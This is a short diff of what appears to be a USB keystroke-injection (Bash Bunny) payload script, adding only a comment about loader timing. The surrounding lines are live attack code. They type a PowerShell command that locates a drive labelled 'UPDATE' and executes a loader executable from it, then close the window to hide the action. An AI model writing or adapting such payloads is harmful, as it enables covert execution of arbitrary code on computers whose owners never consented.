@@ -23,6 +23,7 @@ Q DELAY 500
 LED ATTACK
 Q STRING ".((gwmi win32_volume -f 'label=''UPDATE''').Name+'payloads\\$SWITCH_POSITION\<REPLACE WITH YOUR LOADER>.exe')"
 Q ENTER
+# Update below according to how long your loader will take to execute
 Q DELAY 15000
 Q ALT F4
 Q DELAY 400
